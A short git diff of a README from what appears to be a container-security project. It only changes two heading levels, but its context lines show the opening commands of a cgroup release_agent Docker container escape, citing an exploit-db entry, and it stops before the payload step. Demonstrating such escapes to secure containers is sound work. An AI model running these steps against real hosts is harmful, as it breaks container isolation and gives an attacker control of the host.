@@ -164,12 +164,12 @@ Also, add create lib and lib64 directories to bash to contain libraries for x86 
 
 Reference: https://www.exploit-db.com/exploits/47147
 
-# On the host
+#### On the host
 	docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 	
 ![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/docker_sysadmin.PNG)
 
-# In the container
+#### In the container
 	mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
 	echo 1 > /tmp/cgrp/x/notify_on_release
